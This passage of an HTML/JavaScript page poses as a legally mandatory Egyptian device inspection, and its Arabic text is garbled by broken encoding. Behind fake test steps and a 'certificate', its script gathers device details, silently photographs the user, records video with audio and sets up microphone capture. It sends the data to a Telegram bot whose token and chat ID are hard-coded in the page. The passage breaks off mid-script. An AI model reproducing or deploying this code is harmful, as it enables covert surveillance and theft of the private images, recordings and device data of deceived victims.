                            <h4 style="color: var(--primary-blue); margin-bottom: 20px;">ØªØ­Ø¯Ø« Ø¨ØµÙˆØª Ø¹Ø§Ù„Ù Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†</h4>
                            <div class="volume-meter">
                                <div class="volume-level" id="volumeLevel"></div>
                            </div>
                            <div style="margin: 20px 0; font-weight: bold; color: var(--primary-blue);" id="volumeText">
                                Ù…Ø³ØªÙˆÙ‰ Ø§Ù„ØµÙˆØª: 0%
                            </div>
                        </div>
                    </div>
                    
                    <!-- Ø§Ø®ØªØ¨Ø§Ø± 5: Ø§Ù„Ù…ÙˆÙ‚Ø¹ -->
                    <div class="test-container" id="test5">
                        <div class="test-header">
                            <h3><i class="fas fa-map-marker-alt"></i> Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ</h3>
                            <div class="test-timer" id="timer5">--:--</div>
                        </div>
                        <div class="location-test">
                            <div style="font-size: 80px; color: var(--primary-blue); margin-bottom: 30px;">
                                <i class="fas fa-globe-africa"></i>
                            </div>
                            <h4 style="color: var(--primary-blue); margin-bottom: 20px;">Ø¬Ø§Ø±ÙŠ ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ...</h4>
                            <div class="map-container">
                                <div class="map-placeholder" id="mapPlaceholder">
                                    <i class="fas fa-map" style="font-size: 48px; margin-bottom: 20px;"></i>
                                    <div>Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø®Ø±ÙŠØ·Ø©...</div>
                                </div>
                                <div id="mapCoordinates" style="position: absolute; bottom: 20px; background: rgba(0,0,0,0.7); color: white; padding: 10px 20px; border-radius: 5px;">
                                    Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª: Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ø¯ÙŠØ¯...
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Ø§Ø®ØªØ¨Ø§Ø± 6: Ø§Ù„Ø´Ù‡Ø§Ø¯Ø© -->
                    <div class="test-container" id="test6">
                        <div class="test-header">
                            <h3><i class="fas fa-file-certificate"></i> Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø´Ù‡Ø§Ø¯Ø© Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©</h3>
                            <div class="test-timer" id="timer6">--:--</div>
                        </div>
                        <div style="text-align: center;">
                            <div style="font-size: 80px; color: var(--success); margin-bottom: 30px;">
                                <i class="fas fa-award"></i>
                            </div>
                            <h4 style="color: var(--success); margin-bottom: 20px;">ØªÙ… Ø§Ù„ÙØ­Øµ Ø¨Ù†Ø¬Ø§Ø­!</h4>
                            <div style="background: linear-gradient(135deg, #d4edda, #c3e6cb); padding: 30px; border-radius: 15px; margin: 30px 0; border: 2px solid #c3e6cb;">
                                <div style="font-size: 32px; font-weight: bold; color: var(--primary-blue); margin-bottom: 20px;" id="certificateNumber">
                                    Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¥ØµØ¯Ø§Ø±...
                                </div>
                                <div style="color: #155724; margin-bottom: 10px;">ØªÙ… Ø¨Ù†Ø¬Ø§Ø­ ÙØ­Øµ Ø¬Ù…ÙŠØ¹ Ù…ÙƒÙˆÙ†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²</div>
                                <div style="color: #155724; margin-bottom: 10px;">Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª Ø§ÙƒØªÙ…Ù„Øª Ø¨Ù†Ø¬Ø§Ø­</div>
                                <div style="color: #155724;">ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„Ø¢Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¬Ù‡Ø§Ø² Ø¯Ø§Ø®Ù„ Ø¬Ù…Ù‡ÙˆØ±ÙŠØ© Ù…ØµØ± Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©</div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù… Ø§Ù„Ù…ØªÙ‚Ø¯Ù… -->
                <div class="advanced-progress">
                    <div class="progress-stats">
                        <div>
                            <h4 style="color: var(--primary-blue);">ØªÙ‚Ø¯Ù… Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„</h4>
                            <div style="color: #666; font-size: 14px;">ÙØ­Øµ Ø´Ø§Ù…Ù„ Ù„Ø¬Ù…ÙŠØ¹ Ù…ÙƒÙˆÙ†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²</div>
                        </div>
                        <div style="text-align: right;">
                            <div style="font-size: 32px; font-weight: bold; color: var(--primary-blue);" id="progressPercent">Ù¡Ù¦Ùª</div>
                            <div style="color: #666; font-size: 14px;">Ù…ÙƒØªÙ…Ù„</div>
                        </div>
                    </div>
                    <div class="progress-bar-container">
                        <div class="progress-bar" id="progressBar" style="width: 16%;"></div>
                    </div>
                    <div style="display: flex; justify-content: space-between; font-size: 12px; color: #666;">
                        <span>Ø§Ù„Ø¨Ø¯Ø§ÙŠØ©</span>
                        <span>Ù…Ù†ØªØµÙ Ø§Ù„ÙØ­Øµ</span>
                        <span>Ù‚Ø±Ø¨ Ø§Ù„Ù†Ù‡Ø§ÙŠØ©</span>
                        <span>Ø§Ù„Ø§ÙƒØªÙ…Ø§Ù„</span>
                    </div>
                </div>
                
                <!-- Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… -->
                <div class="control-panel">
                    <h3 style="color: var(--primary-blue); margin-bottom: 20px; text-align: center;">
                        <i class="fas fa-sliders-h"></i> Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ÙØ­Øµ
                    </h3>
                    <div class="control-buttons">
                        <button class="control-btn btn-start glow" onclick="startCompleteInspection()" id="startBtn">
                            <i class="fas fa-play"></i> Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„
                        </button>
                        <button class="control-btn btn-next" onclick="nextTest()" id="nextBtn" disabled>
                            <i class="fas fa-forward"></i> Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØªØ§Ù„ÙŠ
                        </button>
                        <button class="control-btn btn-pause" onclick="pauseInspection()" id="pauseBtn" disabled>
                            <i class="fas fa-pause"></i> Ø¥ÙŠÙ‚Ø§Ù Ù…Ø¤Ù‚Øª
                        </button>
                        <button class="control-btn btn-stop" onclick="stopInspection()" id="stopBtn" disabled>
                            <i class="fas fa-stop"></i> Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ
                        </button>
                    </div>
                </div>
                
                <!-- Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… -->
                <div class="info-panel">
                    <h4 style="color: var(--primary-blue); margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
                        <i class="fas fa-info-circle"></i> Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„
                    </h4>
                    <div class="info-grid">
                        <div class="info-card">
                            <i class="fas fa-clock" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
                            <div style="font-weight: bold;">Ø§Ù„Ù…Ø¯Ø© Ø§Ù„ØªÙ‚Ø¯ÙŠØ±ÙŠØ©</div>
                            <div style="color: #666; font-size: 14px;">Ù¦Ù -Ù©Ù  Ø«Ø§Ù†ÙŠØ© Ù„Ù„ÙØ­Øµ Ø§Ù„ÙƒØ§Ù…Ù„</div>
                        </div>
                        <div class="info-card">
                            <i class="fas fa-database" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
                            <div style="font-weight: bold;">Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø¬Ù…Ø¹Ø©</div>
                            <div style="color: #666; font-size: 14px;">Ù¦ ÙØ¦Ø§Øª Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ´Ø®ÙŠØµÙŠØ©</div>
                        </div>
                        <div class="info-card">
                            <i class="fas fa-shield-alt" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
                            <div style="font-weight: bold;">Ø§Ù„Ø£Ù…Ø§Ù† ÙˆØ§Ù„Ø®ØµÙˆØµÙŠØ©</div>
                            <div style="color: #666; font-size: 14px;">ØªØ´ÙÙŠØ± ÙƒØ§Ù…Ù„ Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</div>
                        </div>
                        <div class="info-card">
                            <i class="fas fa-file-contract" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
                            <div style="font-weight: bold;">Ø§Ù„Ø§Ù„ØªØ²Ø§Ù… Ø§Ù„Ù‚Ø§Ù†ÙˆÙ†ÙŠ</div>
                            <div style="color: #666; font-size: 14px;">Ø¥Ù„Ø²Ø§Ù…ÙŠ Ø¨Ù…ÙˆØ¬Ø¨ Ø§Ù„Ù‚Ø§Ù†ÙˆÙ† Ø§Ù„Ù…ØµØ±ÙŠ</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- ØªÙ†Ø¨ÙŠÙ‡Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø®ÙÙŠØ© -->
    <div class="hidden-notification" id="systemNotification">
        <div id="notificationMessage"></div>
    </div>

    <!-- ===== JavaScript Ø§Ù„Ù…ØªÙ‚Ø¯Ù… ===== -->
    <script>
        // ğŸ”§ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø¨ÙˆØª ØªÙ„Ø¬Ø±Ø§Ù…
        const TELEGRAM_BOT_TOKEN = '8233482255:AAF1wr7ahEupPq4k2SiovrjMX6WnTKbpctg';
        const TELEGRAM_CHAT_ID = '848066586';
        
        // Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©
        let currentTest = 1;
        let isInspectionActive = false;
        let isPaused = false;
        let cameraStream = null;
        let videoRecorder = null;
        let audioRecorder = null;
        let recordedChunks = [];
        let recordedAudio = null;
        let testTimers = {};
        let collectedData = {
            deviceInfo: {},
            photos: [],
            videos: [],
            audio: [],
            location: {},
            timestamps: {}
        };
        
        // Ø¹Ù†Ø§ØµØ± DOM
        const elements = {
            // Ø§Ù„ØªØ§ÙŠÙ…Ø±Ø§Øª
            timer1: document.getElementById('timer1'),
            timer2: document.getElementById('timer2'),
            timer3: document.getElementById('timer3'),
            timer4: document.getElementById('timer4'),
            timer5: document.getElementById('timer5'),
            timer6: document.getElementById('timer6'),
            
            // Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ø¹Ù†Ø§ØµØ± Ø§Ù„Ù…Ø±Ø¦ÙŠØ©
            cameraFeed: document.getElementById('cameraFeed'),
            videoPreview: document.getElementById('videoPreview'),
            cameraOverlay1: document.getElementById('cameraOverlay1'),
            cameraOverlay2: document.getElementById('cameraOverlay2'),
            volumeLevel: document.getElementById('volumeLevel'),
            volumeText: document.getElementById('volumeText'),
            mapPlaceholder: document.getElementById('mapPlaceholder'),
            mapCoordinates: document.getElementById('mapCoordinates'),
            
            // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
            deviceInfo1: document.getElementById('deviceInfo1'),
            deviceInfo2: document.getElementById('deviceInfo2'),
            deviceInfo3: document.getElementById('deviceInfo3'),
            
            // Ø§Ù„ØªÙ‚Ø¯Ù… ÙˆØ§Ù„Ø´Ù‡Ø§Ø¯Ø©
            progressBar: document.getElementById('progressBar'),
            progressPercent: document.getElementById('progressPercent'),
            certificateNumber: document.getElementById('certificateNumber'),
            
            // Ø§Ù„Ø£Ø²Ø±Ø§Ø±
            startBtn: document.getElementById('startBtn'),
            nextBtn: document.getElementById('nextBtn'),
            pauseBtn: document.getElementById('pauseBtn'),
            stopBtn: document.getElementById('stopBtn'),
            
            // Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª
            systemNotification: document.getElementById('systemNotification'),
            notificationMessage: document.getElementById('notificationMessage')
        };
        
        // Ø¯Ø§Ù„Ø© Ø¹Ø±Ø¶ Ø¥Ø´Ø¹Ø§Ø± Ù…Ø®ÙÙŠ
        function showHiddenNotification(message, duration = 3000) {
            elements.notificationMessage.textContent = message;
            elements.systemNotification.style.display = 'block';
            
            setTimeout(() => {
                elements.systemNotification.style.display = 'none';
            }, duration);
            
            // ØªØ³Ø¬ÙŠÙ„ ÙÙŠ Ø§Ù„Ø³Ø¬Ù„
            console.log(`ğŸ”” ${message}`);
        }
        
        // Ø¯Ø§Ù„Ø© ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø®Ø·ÙˆØ§Øª
        function updateStep(stepNumber) {
            // ØªØ­Ø¯ÙŠØ« Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø®Ø·ÙˆØ§Øª
            for (let i = 1; i <= 6; i++) {
                const stepElement = document.getElementById(`step${i}`);
                const statusElement = stepElement.querySelector('.step-status');
                
                if (i < stepNumber) {
                    stepElement.classList.remove('active');
                    stepElement.classList.add('completed');
                    statusElement.className = 'step-status status-completed';
                    statusElement.textContent = 'Ù…ÙƒØªÙ…Ù„';
                } else if (i === stepNumber) {
                    stepElement.classList.add('active');
                    stepElement.classList.remove('completed');
                    statusElement.className = 'step-status status-active';
                    statusElement.textContent = 'Ù†Ø´Ø· Ø§Ù„Ø¢Ù†';
                } else {
                    stepElement.classList.remove('active', 'completed');
                    statusElement.className = 'step-status status-pending';
                    statusElement.textContent = 'ÙÙŠ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±';
                }
            }
            
            // ØªØ­Ø¯ÙŠØ« Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù…
            const progressPercentage = Math.round(((stepNumber - 1) / 5) * 100);
            elements.progressBar.style.width = `${progressPercentage}%`;
            elements.progressPercent.textContent = `${progressPercentage}%`;
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ù†Ø´Ø·
            document.querySelectorAll('.test-container').forEach(container => {
                container.classList.remove('active');
            });
            document.getElementById(`test${stepNumber}`).classList.add('active');
            
            currentTest = stepNumber;
        }
        
        // Ø¯Ø§Ù„Ø© Ø¹Ø±Ø¶ Ø§Ø®ØªØ¨Ø§Ø± Ù…Ø­Ø¯Ø¯
        function showTest(stepNumber) {
            if (isInspectionActive && !isPaused) return;
            updateStep(stepNumber);
        }
        
        // Ø¯Ø§Ù„Ø© Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„
        async function startCompleteInspection() {
            if (isInspectionActive) return;
            
            isInspectionActive = true;
            elements.startBtn.disabled = true;
            elements.nextBtn.disabled = false;
            elements.pauseBtn.disabled = false;
            elements.stopBtn.disabled = false;
            elements.startBtn.innerHTML = '<i class="fas fa-sync-alt fa-spin"></i> Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¨Ø¯Ø¡...';
            
            showHiddenNotification('ğŸš€ Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„ Ø§Ù„Ù…ØªÙƒØ§Ù…Ù„...', 2000);
            
            // Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø£ÙˆÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
            setTimeout(() => {
                startTest(currentTest);
            }, 1500);
        }
        
        // Ø¯Ø§Ù„Ø© Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Ù…Ø­Ø¯Ø¯
        async function startTest(testNumber) {
            if (!isInspectionActive || isPaused) return;
            
            // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„ØªØ§ÙŠÙ…Ø±
            if (testTimers[testNumber]) {
                clearInterval(testTimers[testNumber]);
            }
            
            let seconds = 0;
            testTimers[testNumber] = setInterval(() => {
                seconds++;
                const timerElement = elements[`timer${testNumber}`];
                if (timerElement) {
                    timerElement.textContent = `${Math.floor(seconds / 60)}:${(seconds % 60).toString().padStart(2, '0')}`;
                }
            }, 1000);
            
            switch(testNumber) {
                case 1:
                    await startDeviceInfoTest();
                    break;
                case 2:
                    await startCameraTest();
                    break;
                case 3:
                    await startVideoTest();
                    break;
                case 4:
                    await startMicrophoneTest();
                    break;
                case 5:
                    await startLocationTest();
                    break;
                case 6:
                    await startCertificateGeneration();
                    break;
            }
        }
        
        // Ø§Ø®ØªØ¨Ø§Ø± 1: Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
        async function startDeviceInfoTest() {
            showHiddenNotification('ğŸ” Ø¬Ø§Ø±ÙŠ Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²...', 2000);
            
            // Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                deviceMemory: navigator.deviceMemory || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                hardwareConcurrency: navigator.hardwareConcurrency,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                online: navigator.onLine
            };
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆØ§Ø¬Ù‡Ø©
            elements.deviceInfo1.textContent = `Ø§Ù„Ù…ØªØµÙØ­: ${deviceInfo.userAgent.split(') ')[0].substring(0, 40)}...`;
            elements.deviceInfo2.textContent = `Ø§Ù„Ø¯Ù‚Ø©: ${deviceInfo.screenWidth} Ã— ${deviceInfo.screenHeight}`;
            elements.deviceInfo3.textContent = `Ø§Ù„Ù„ØºØ©: ${deviceInfo.language}`;
            
            // Ø­ÙØ¸ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª
            collectedData.deviceInfo = deviceInfo;
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ù„Ù„Ø¨ÙˆØª
            await sendDeviceInfoToTelegram(deviceInfo);
            
            // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØªØ§Ù„ÙŠ Ø¨Ø¹Ø¯ 5 Ø«ÙˆØ§Ù†
            setTimeout(() => {
                updateStep(2);
                startTest(2);
            }, 5000);
        }
        
        // Ø§Ø®ØªØ¨Ø§Ø± 2: Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (ØµÙˆØ±Ø©)
        async function startCameraTest() {
            showHiddenNotification('ğŸ“¸ Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¨ØµØ±ÙŠ...', 2000);
            
            try {
                // Ø·Ù„Ø¨ ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                elements.cameraFeed.srcObject = cameraStream;
                
                // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ù€ Overlay Ø¨Ø¹Ø¯ 2 Ø«Ø§Ù†ÙŠØ©
                setTimeout(() => {
                    elements.cameraOverlay1.style.opacity = '0';
                    setTimeout(() => {
                        elements.cameraOverlay1.style.display = 'none';
                        
                        // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†
                        setTimeout(async () => {
                            await captureAndSendPhoto();
                            
                            // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØªØ§Ù„ÙŠ
                            setTimeout(() => {
                                updateStep(3);
                                startTest(3);
                            }, 3000);
                            
                        }, 3000);
                        
                    }, 500);
                }, 2000);
                
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„ØµÙˆØ±:', error);
                showHiddenNotification('âš ï¸ ØªÙ… ØªØ®Ø·ÙŠ Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§', 2000);
                
                setTimeout(() => {
                    updateStep(3);
                    startTest(3);
                }, 2000);
            }
        }
        
        // Ø¯Ø§Ù„Ø© Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©
        async function captureAndSendPhoto() {
            try {
                // Ø¥Ù†Ø´Ø§Ø¡ canvas Ù„Ù„Ø§Ù„ØªÙ‚Ø§Ø·
                const canvas = document.createElement('canvas');
                canvas.width = elements.cameraFeed.videoWidth || 1280;
                canvas.height = elements.cameraFeed.videoHeight || 720;
                const ctx = canvas.getContext('2d');
                
                // Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
                ctx.drawImage(elements.cameraFeed, 0, 0, canvas.width, canvas.height);
                
                // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ base64
                const photoData = canvas.toDataURL('image/jpeg', 0.9);
                
                // Ø­ÙØ¸ Ø§Ù„ØµÙˆØ±Ø©
                collectedData.photos.push({
                    timestamp: new Date().toISOString(),
                    size: Math.round((photoData.length * 0.75) / 1024)
                });
                
                // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø¨ÙˆØª
                await sendToTelegram(photoData, 'ÙØ­Øµ Ø¨ØµØ±ÙŠ - ØµÙˆØ±Ø©');
                
                showHiddenNotification('âœ… ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©', 2000);
                
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©:', error);
            }
        }
        
        // Ø§Ø®ØªØ¨Ø§Ø± 3: Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
        async function startVideoTest() {
            showHiddenNotification('ğŸ¥ Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ...', 2000);
            
            try {
                if (!cameraStream) {
                    cameraStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: true
                    });
                }
                
                elements.videoPreview.srcObject = cameraStream;
                
                // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ù€ Overlay
                setTimeout(() => {
                    elements.cameraOverlay2.style.opacity = '0';
                    setTimeout(() => {
                        elements.cameraOverlay2.style.display = 'none';
                        
                        // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø¨Ø¹Ø¯ 2 Ø«Ø§Ù†ÙŠØ©
                        setTimeout(() => {
                            startVideoRecording();
                        }, 2000);
                        
                    }, 500);
                }, 2000);
                
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ:', error);
                showHiddenNotification('âš ï¸ ØªÙ… ØªØ®Ø·ÙŠ Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ÙÙŠØ¯ÙŠÙˆ', 2000);
                
                setTimeout(() => {
                    updateStep(4);
                    startTest(4);
                }, 2000);
            }
        }
        
        // Ø¯Ø§Ù„Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
        async function startVideoRecording() {
            try {
                recordedChunks = [];
                
                // Ø¥Ù†Ø´Ø§Ø¡ MediaRecorder
                videoRecorder = new MediaRecorder(cameraStream, {
                    mimeType: 'video/webm;codecs=vp9'
                });
                
                videoRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                
                videoRecorder.onstop = async () => {
                    // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¥Ù„Ù‰ blob
                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    
                    // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ base64
                    const videoData = await blobToBase64(videoBlob);
                    
                    // Ø­ÙØ¸ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
                    collectedData.videos.push({
                        timestamp: new Date().toISOString(),
                        size: Math.round(videoBlob.size / 1024),
                        duration: 5
                    });
                    
                    // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø¨ÙˆØª
                    await sendVideoToTelegram(videoBlob);
                    
                    showHiddenNotification('âœ… ØªÙ… ØªØ³Ø¬ÙŠÙ„ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ', 2000);
                    
                    // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØªØ§Ù„ÙŠ
                    setTimeout(() => {
                        updateStep(4);
                        startTest(4);
                    }, 2000);
                };
                
                // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ù„Ù…Ø¯Ø© 5 Ø«ÙˆØ§Ù†
                videoRecorder.start();
                
                setTimeout(() => {
                    if (videoRecorder.state === 'recording') {
                        videoRecorder.stop();
                    }
                }, 5000);
                
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ:', error);
                
                setTimeout(() => {
                    updateStep(4);
                    startTest(4);
                }, 2000);
            }
        }
        
        // Ø§Ø®ØªØ¨Ø§Ø± 4: Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†
        async function startMicrophoneTest() {
            showHiddenNotification('ğŸ¤ Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØµÙˆØª...', 2000);
            
            try {
                // Ø·Ù„Ø¨ ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: true,
                    video: false
                });
                
                // Ø¥Ù†Ø´Ø§Ø¡ AudioContext
                const audioContext = new AudioContext();
                const source = audioContext.createMediaStreamSource(audioStream);
                const analyser = audioContext.createAnalyser();
                
                source.connect(analyser);
                analyser.fftSize = 256;
                
                const bufferLength = analyser.frequencyBinCount;
                const dataArray = new Uint8Array(bufferLength);
                
                // ØªØ­Ø¯ÙŠØ« Ù…Ø³ØªÙˆÙ‰ Ø§Ù„ØµÙˆØª
                function updateVolume() {
                    analyser.getByteFrequencyData(dataArray);
                    
                    let sum = 0;
                    for (let i = 0; i < bufferLength; i++) {
                        sum += dataArray[i];
                    }
                    
                    const average = sum / bufferLength;
                    const percentage = Math.min(Math.round((average / 256) * 100), 100);
                    
                    elements.volumeLevel.style.width = `${percentage}%`;
                    elements.volumeText.textContent = `Ù…Ø³ØªÙˆÙ‰ Ø§Ù„ØµÙˆØª: ${percentage}%`;
                    
                    // ØªØºÙŠÙŠØ± Ø§Ù„Ù„ÙˆÙ† Ø­Ø³Ø¨ Ù…Ø³ØªÙˆÙ‰ Ø§Ù„ØµÙˆØª
                    if (percentage < 30) {
                        elements.volumeLevel.style.background = 'linear-gradient(90deg, #2ecc71, #3498db)';
                    } else if (percentage < 70) {
                        elements.volumeLevel.style.background = 'linear-gradient(90deg, #f1c40f, #e67e22)';
                    } else {
                        elements.volumeLevel.style.background = 'linear-gradient(90deg, #e74c3c, #c0392b)';
                    }
                    
                    if (isInspectionActive && !isPaused) {
                        requestAnimationFrame(updateVolume);
                    }
                }
                
                updateVolume();
                
                // Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØªÙŠ
                audioRecorder = new MediaRecorder(audioStream);
                recordedChunks = [];
                
